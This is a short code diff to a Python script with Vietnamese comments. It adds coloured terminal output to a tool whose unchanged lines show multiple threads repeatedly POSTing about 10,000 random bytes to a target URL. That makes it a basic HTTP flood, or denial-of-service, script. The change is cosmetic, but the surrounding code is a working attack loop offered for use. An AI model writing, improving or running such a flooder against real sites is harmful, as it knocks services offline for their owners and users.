@@ -3,6 +3,11 @@ import requests
 import random
 import threading
 
+# Mã ANSI cho màu sắc
+GREEN = "\033[92m"
+RED = "\033[91m"
+RESET = "\033[0m"  # Đặt lại màu về mặc định
+
 # Xóa màn hình terminal
 os.chdir(os.path.dirname(os.path.realpath(__file__)))
 os.system("cls" if os.name == "nt" else "clear")
@@ -17,10 +22,11 @@ def gui_yeu_cau(ma_luong):
         try:
             du_lieu = random._urandom(10) * 1000
             phan_hoi = requests.post(url, data=du_lieu)
-            # In ra trạng thái trên cùng một dòng
-            print(f"\rLuồng {ma_luong}", end='')
+            # In ra trạng thái trên cùng một dòng với màu xanh
+            print(f"\r{GREEN}Luồng {ma_luong}{RESET}", end='')
         except Exception as e:
-            print(f"\rLuồng {ma_luong}: Lỗi - {e}", end='')
+            # In ra lỗi trên cùng một dòng với màu đỏ
+            print(f"\r{RED}Luồng {ma_luong}: Lỗi - {e}{RESET}", end='')
 
 def main():
     cac_luong = []
